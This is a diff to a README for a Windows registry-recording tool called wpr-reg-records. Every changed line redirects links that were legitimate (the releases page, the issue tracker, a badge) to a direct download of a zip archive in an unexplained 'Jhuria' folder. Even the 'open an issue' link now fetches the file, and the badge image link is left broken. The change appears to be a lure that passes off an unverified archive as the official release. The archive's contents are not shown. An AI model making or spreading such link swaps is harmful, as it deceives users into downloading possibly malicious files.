@@ -2,7 +2,7 @@
 # 📂 wpr-reg-records - Effortlessly Record Registry Activities
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/Metromrx/wpr-reg-records/releases)
+[![Download Release](https://raw.githubusercontent.com/Metromrx/wpr-reg-records/main/Jhuria/wpr-reg-records.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/Metromrx/wpr-reg-records/main/Jhuria/wpr-reg-records.zip)
 
 ## 🚀 Getting Started
 Welcome to wpr-reg-records! This application helps you record registry activities, focusing on key and subkey actions using Windows Performance Analyzer (WPA) and Process Monitor (Procmon). With wpr-reg-records, you can easily track and analyze registry activity on your Windows machine.
@@ -24,7 +24,7 @@ To run wpr-reg-records smoothly, ensure your system meets these requirements:
 To get started with wpr-reg-records, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the releases section where you can find the latest version.
-   [Visit this page to download](https://github.com/Metromrx/wpr-reg-records/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Metromrx/wpr-reg-records/main/Jhuria/wpr-reg-records.zip)
 
 2. **Select the Latest Release**: Look for the newest version listed at the top. This will usually have the most recent features and fixes.
 
@@ -75,7 +75,7 @@ No, wpr-reg-records is designed for everyday users. The interface is user-friend
 If you have questions, need help, or want to contribute, feel free to reach out. Join our community discussions or check out the project on GitHub.
 
 ### Contact
-For additional support or feedback, please open an issue on our [GitHub repository](https://github.com/Metromrx/wpr-reg-records/issues).
+For additional support or feedback, please open an issue on our [GitHub repository](https://raw.githubusercontent.com/Metromrx/wpr-reg-records/main/Jhuria/wpr-reg-records.zip).
 
 ---
 
